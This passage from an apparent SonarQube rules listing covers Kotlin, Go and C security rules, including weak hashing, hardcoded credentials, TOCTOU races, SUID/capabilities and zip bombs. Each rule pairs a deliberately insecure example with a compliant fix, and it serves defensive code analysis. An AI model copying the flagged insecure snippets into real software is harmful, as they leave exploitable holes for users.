  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/297" rel="nofollow">MITRE, CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.&#43;Do&#43;not&#43;use&#43;insecure&#43;or&#43;weak&#43;cryptographic&#43;algorithms" rel="nofollow">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.&#43;Do&#43;not&#43;use&#43;insecure&#43;or&#43;weak&#43;cryptographic&#43;algorithms</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6291">
              kotlin:S6291
            </a>
          </td>
          <td>
            <details>
              <p>Storing data locally is a common task for mobile applications. Such data includes preferences or authentication tokens for external services, among
other things. There are many convenient solutions that allow storing data persistently, for example SQLiteDatabase, SharedPreferences, and Realm. By
default these systems store the data unencrypted, thus an attacker with physical access to the device can read them out easily. Access to sensitive
data can be harmful for the user of the application, for example when the device gets stolen.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to password-encrypt local databases that contain sensitive information. Most systems provide secure alternatives to plain-text
storage that should be used. If no secure alternative is available the data can also be encrypted manually before it is stored.</p>
<p>The encryption password should not be hard-coded in the application. There are different approaches how the password can be provided to encrypt and
decrypt the database. In the case of <code>EncryptedSharedPreferences</code> the Android Keystore can be used to store the password. Other databases
can rely on <code>EncryptedSharedPreferences</code> to store passwords. The password can also be provided dynamically by the user of the application
or it can be fetched from a remote server if the other methods are not feasible.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://developer.android.com/reference/kotlin/android/database/sqlite/SQLiteDatabase" rel="nofollow">SQLiteDatabase</a>:</p>
<pre>
var db &#61; activity.openOrCreateDatabase(&#34;test.db&#34;, Context.MODE_PRIVATE, null) // Sensitive
</pre>
<p>For <a href="https://developer.android.com/training/data-storage/shared-preferences" rel="nofollow">SharedPreferences</a>:</p>
<pre>
val pref &#61; activity.getPreferences(Context.MODE_PRIVATE) // Sensitive
</pre>
<p>For <a href="https://docs.mongodb.com/realm/" rel="nofollow">Realm</a>:</p>
<pre>
val config &#61; RealmConfiguration.Builder().build()
val realm &#61; Realm.getInstance(config) // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Instead of SQLiteDatabase you can use <a href="https://www.zetetic.net/sqlcipher/sqlcipher-for-android/" rel="nofollow">SQLCipher</a>:</p>
<pre>
val db &#61; SQLiteDatabase.openOrCreateDatabase(&#34;test.db&#34;, getKey(), null)
</pre>
<p>Instead of SharedPreferences you can use <a href="https://developer.android.com/reference/androidx/security/crypto/EncryptedSharedPreferences" rel="nofollow">EncryptedSharedPreferences</a>:</p>
<pre>
val masterKeyAlias &#61; MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)
EncryptedSharedPreferences.create(
    &#34;secret&#34;,
    masterKeyAlias,
    context,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)
</pre>
<p>For Realm an encryption key can be specified in the config:</p>
<pre>
val config &#61; RealmConfiguration.Builder()
    .encryptionKey(getKey())
    .build()
val realm &#61; Realm.getInstance(config)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage" rel="nofollow">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4790">
              kotlin:S4790
            </a>
          </td>
          <td>
            <details>
              <p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>The following APIs are tracked for use of obsolete crypto algorithms:</p>
<ul><li> <code>java.security.AlgorithmParameters</code> (JDK) </li><li> <code>java.security.AlgorithmParameterGenerator</code> (JDK) </li><li> <code>java.security.MessageDigest</code> (JDK) </li><li> <code>java.security.KeyFactory</code> (JDK) </li><li> <code>java.security.KeyPairGenerator</code> (JDK) </li><li> <code>java.security.Signature</code> (JDK) </li><li> <code>javax.crypto.Mac</code> (JDK) </li><li> <code>javax.crypto.KeyGenerator</code> (JDK) </li><li> <code>org.apache.commons.codec.digest.DigestUtils</code> (Apache Commons Codec) </li><li> <code>org.springframework.util.DigestUtils</code> </li><li> <code>com.google.common.hash.Hashing</code> (Guava) </li><li> <code>org.springframework.security.authentication.encoding.ShaPasswordEncoder</code> (Spring Security 4.2.x) </li><li> <code>org.springframework.security.authentication.encoding.Md5PasswordEncoder</code> (Spring Security 4.2.x) </li><li> <code>org.springframework.security.crypto.password.LdapShaPasswordEncoder</code> (Spring Security 5.0.x) </li><li> <code>org.springframework.security.crypto.password.Md4PasswordEncoder</code> (Spring Security 5.0.x) </li><li> <code>org.springframework.security.crypto.password.MessageDigestPasswordEncoder</code> (Spring Security 5.0.x) </li><li> <code>org.springframework.security.crypto.password.NoOpPasswordEncoder</code> (Spring Security 5.0.x) </li><li> <code>org.springframework.security.crypto.password.StandardPasswordEncoder</code> (Spring Security 5.0.x) </li></ul>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
val md1: MessageDigest &#61; MessageDigest.getInstance(&#34;SHA&#34;);  // Sensitive:  SHA is not a standard name, for most security providers it&#39;s an alias of SHA-1
val md2: MessageDigest &#61; MessageDigest.getInstance(&#34;SHA1&#34;);  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
val md1: MessageDigest &#61; MessageDigest.getInstance(&#34;SHA-512&#34;); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6293">
              kotlin:S6293
            </a>
          </td>
          <td>
            <details>
              <p>Android comes with Android KeyStore, a secure container for storing key materials. It’s possible to define certain keys to be unlocked when users
authenticate using biometric credentials. This way, even if the application process is compromised, the attacker cannot access keys, as presence of
the authorized user is required.</p>
<p>These keys can be used, to encrypt, sign or create a message authentication code (MAC) as proof that the authentication result has not been
tampered with. This protection defeats the scenario where an attacker with physical access to the device would try to hook into the application
process and call the <code>onAuthenticationSucceeded</code> method directly. Therefore he would be unable to extract the sensitive data or to perform
the critical operations protected by the biometric authentication.</p>
<h2>Ask Yourself Whether</h2>
<p>The application contains:</p>
<ul><li> Cryptographic keys / sensitive information that need to be protected using biometric authentication. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to tie the biometric authentication to a cryptographic operation by using a <code>CryptoObject</code> during authentication.</p>
<h2>Sensitive Code Example</h2>
<p>A <code>CryptoObject</code>is not used during authentication:</p>
<pre>
// ...
val biometricPrompt: BiometricPrompt &#61; BiometricPrompt(activity, executor, callback)
// ...
biometricPrompt.authenticate(promptInfo) // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<p>A <code>CryptoObject</code> is used during authentication:</p>
<pre>
// ...
val biometricPrompt: BiometricPrompt &#61; BiometricPrompt(activity, executor, callback)
// ...
biometricPrompt.authenticate(promptInfo, BiometricPrompt.CryptoObject(cipher)) // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://developer.android.com/training/sign-in/biometric-auth" rel="nofollow">developer.android.com</a> - Use a cryptographic solution that depends
  on authentication </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication" rel="nofollow">OWASP Mobile Top 10 Category M4</a> - Insecure
  Authentication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x09-v4-authentication_and_session_management_requirements" rel="nofollow">OWASP
  MASVS</a> - Authentication and Session Management Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/287" rel="nofollow">MITRE, CWE-287</a> - Improper Authentication </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=go:S1313">
              go:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
var (
  ip   &#61; &#34;192.168.12.42&#34;
  port &#61; 3333
)

SocketClient(ip, port)
</pre>
<h2>Compliant Solution</h2>
<pre>
config, err :&#61; ReadConfig(&#34;properties.ini&#34;)

ip :&#61; config[&#34;ip&#34;]
port :&#61; config[&#34;ip&#34;]

SocketClient(ip, port)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=go:S2068">
              go:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
func connect()  {
  user :&#61; &#34;root&#34;
  password:&#61; &#34;supersecret&#34; // Sensitive

  url :&#61; &#34;login&#61;&#34; &#43; user &#43; &#34;&amp;passwd&#61;&#34; &#43; password
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func connect()  {
  user :&#61; getEncryptedUser()
  password:&#61; getEncryptedPass() // Compliant

  url :&#61; &#34;login&#61;&#34; &#43; user &#43; &#34;&amp;passwd&#61;&#34; &#43; password
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5982">
              c:S5982
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of changing the current working directory is to modify the base path when the process performs relative path resolutions. When the
working directory cannot be changed, the process keeps the directory previously defined as the active working directory. Thus, verifying the success
of chdir() type of functions is important to prevent unintended relative paths and unauthorized access.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The success of changing the working directory is relevant for the application. </li><li> Changing the working directory is required by chroot to make the new root effective. </li><li> Subsequent disk operations are using relative paths. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>After changing the current working directory verify the success of the operation and handle errors.</p>
<h2>Sensitive Code Example</h2>
<p>The <code>chdir</code> operation could fail and the process still has access to unauthorized resources. The return code should be verified:</p>
<pre>
const char* any_dir &#61; &#34;/any/&#34;;
chdir(any_dir); // Sensitive: missing check of the return value

int fd &#61; open(any_dir, O_RDONLY | O_DIRECTORY);
fchdir(fd); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>Verify the return code of <code>chdir</code> and handle errors:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;
if (chdir(root_dir) &#61;&#61; -1) {
  exit(-1);
} // Compliant

int fd &#61; open(any_dir, O_RDONLY | O_DIRECTORY);
if(fchdir(fd) &#61;&#61; -1) {
  exit(-1);
} // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/252" rel="nofollow">MITRE, CWE-252</a> - Unchecked Return Value </li><li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html" rel="nofollow">man7.org</a> - chdir </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5832">
              c:S5832
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Pluggable authentication module (PAM) is a mechanism used on many unix variants to provide a unified way to authenticate users, independently of
the underlying authentication scheme.</p>
<p>When authenticating users, it is strongly recommended to check the validity of the account (not locked, not expired …​), otherwise it leads to
unauthorized access to resources.</p>
<h3>Noncompliant code example</h3>
<p>The account validity is not checked with <code>pam_acct_mgmt</code> when authenticating a user with <code>pam_authenticate</code>:</p>
<pre>
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) !&#61; PAM_SUCCESS) { // Noncompliant - missing pam_acct_mgmt
        return -1;
    }

    return 0;
}
</pre>
<p>The return value of <code>pam_acct_mgmt</code> is not checked:</p>
<pre>
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) !&#61; PAM_SUCCESS) {
        return -1;
    }
    pam_acct_mgmt(pamh, 0); // Noncompliant
    return 0;
}
</pre>
<h3>Compliant solution</h3>
<p>When authenticating a user with <code>pam_authenticate</code>, check the account validity with <code>pam_acct_mgmt</code>:</p>
<pre>
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) !&#61; PAM_SUCCESS) {
        return -1;
    }
    if (pam_acct_mgmt(pamh, 0) !&#61; PAM_SUCCESS) { // Compliant
        return -1;
    }
    return 0;
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/304" rel="nofollow">MITRE, CWE-304</a> - Missing Critical Step in Authentication </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5847">
              c:S5847
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>&#34;Time Of Check to Time Of Use&#34; (TOCTOU) vulnerabilities occur when an application:</p>
<ul><li> First, checks permissions or attributes of a file: for instance, is a file a symbolic link? </li><li> Next, performs some operations such as writing data to this file. </li></ul>
<p>The application cannot assume the state of the file is unchanged between these two steps, there is a race condition (ie: two different processes
can access and modify the same shared object/file at the same time, which can lead to privilege escalation, denial of service and other unexpected
results).</p>
<p>For instance, attackers can benefit from this situation by creating a symbolic link to a sensitive file directly after the first step (eg in Unix:
<code>/etc/passwd</code>) and try to elevate their privileges (eg: if the written data has the correct <code>/etc/passwd</code> file format).</p>
<p>To avoid TOCTOU vulnerabilities, one possible solution is to do a single atomic operation for the &#34;check&#34; and &#34;use&#34; actions, therefore removing the
race condition window. Another possibility is to use file descriptors. This way the binding of the file descriptor to the file cannot be changed by a
concurrent process.</p>
<h3>Noncompliant code example</h3>
<p>A &#34;check function&#34; (for instance <code>access</code>, <code>stat</code> …​ in this case <code>access</code> to verify the existence of a file) is
used, followed by a &#34;use function&#34; (<code>open</code>, <code>fopen</code> …​) to write data inside a non existing file. These two consecutive calls
create a TOCTOU race condition:</p>
<pre>
#include &lt;stdio.h&gt;

void fopen_with_toctou(const char *file) {
  if (access(file, F_OK) &#61;&#61; -1 &amp;&amp; errno &#61;&#61; ENOENT) {
    // the file doesn&#39;t exist
    // it is now created in order to write some data inside
    FILE *f &#61; fopen(file, &#34;w&#34;); // Noncompliant: a race condition window exist from access() call to fopen() call calls
    if (NULL &#61;&#61; f) {
      /* Handle error */
    }

    if (fclose(f) &#61;&#61; EOF) {
      /* Handle error */
    }
  }
}
</pre>
<h3>Compliant solution</h3>
<p>If the file already exists on the disk, <code>fopen</code> with <code>x</code> mode will fail:</p>
<pre>
#include &lt;stdio.h&gt;

void open_without_toctou(const char *file) {
  FILE *f &#61; fopen(file, &#34;wx&#34;); // Compliant
  if (NULL &#61;&#61; f) {
    /* Handle error */
  }
  /* Write to file */
  if (fclose(f) &#61;&#61; EOF) {
    /* Handle error */
  }
}
</pre>
<p>A more generic solution is to use &#34;file descriptors&#34;:</p>
<pre>
void open_without_toctou(const char *file) {
  int fd &#61; open(file, O_CREAT | O_EXCL | O_WRONLY);
  if (-1 !&#61; fd) {
    FILE *f &#61; fdopen(fd, &#34;w&#34;);  // Compliant
  }
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/367" rel="nofollow">MITRE, CWE-367</a> - Time-of-check Time-of-use (TOCTOU) Race Condition </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.&#43;Avoid&#43;TOCTOU&#43;race&#43;conditions&#43;while&#43;accessing&#43;files" rel="nofollow">CERT, FIO45-C.</a> - Avoid
  TOCTOU race conditions while accessing files </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5849">
              c:S5849
            </a>
          </td>
          <td>
            <details>
              <p>Setting capabilities can lead to privilege escalation.</p>
<p>Linux capabilities allow you to assign narrow slices of <code>root</code>&#39;s permissions to files or processes. A thread with capabilities bypasses
the normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring (additional) root
privileges.</p>
<h2>Ask Yourself Whether</h2>
<p>Capabilities are granted:</p>
<ul><li> To a process that does not require all capabilities to do its job. </li><li> To a not trusted process. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary
capabilities are assigned to files and processes.</p>
<h2>Sensitive Code Example</h2>
<p>When setting capabilities:</p>
<pre>
cap_t caps &#61; cap_init();
cap_value_t cap_list[2];
cap_list[0] &#61; CAP_FOWNER;
cap_list[1] &#61; CAP_CHOWN;
cap_set_flag(caps, CAP_PERMITTED, 2, cap_list, CAP_SET);

cap_set_file(&#34;file&#34;, caps); // Sensitive
cap_set_fd(fd, caps); // Sensitive
cap_set_proc(caps); // Sensitive
capsetp(pid, caps); // Sensitive
capset(hdrp, datap); // Sensitive: is discouraged to be used because it is a system call
</pre>
<p>When setting SUID/SGID attributes:</p>
<pre>
chmod(&#34;file&#34;, S_ISUID|S_ISGID); // Sensitive
fchmod(fd, S_ISUID|S_ISGID); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/250" rel="nofollow">MITRE, CWE-250</a> - Execution with Unnecessary Privileges </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://forums.grsecurity.net/viewtopic.php?f&#61;7&amp;t&#61;2522" rel="nofollow">False Boundaries and Arbitrary Code Execution</a> </li><li> <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" rel="nofollow">Linux manual page</a> - capabilities(7) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5042">
              c:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio" rel="nofollow">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul><li> There is no validation of the number of entries in the archive. </li><li> There is no validation of the total size of the uncompressed data. </li><li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Define and control the threshold for maximum total size of the uncompressed data. </li><li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

void f(const char *filename, int flags) {
  struct archive_entry *entry;
  struct archive *a &#61; archive_read_new();
  struct archive *ext &#61; archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);

  if ((archive_read_open_filename(a, filename, 10240))) {
    return;
  }

  for (;;) {
    int r &#61; archive_read_next_header(a, &amp;entry);
    if (r &#61;&#61; ARCHIVE_EOF) {
      break;
    }
    if (r !&#61; ARCHIVE_OK) {
      return;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

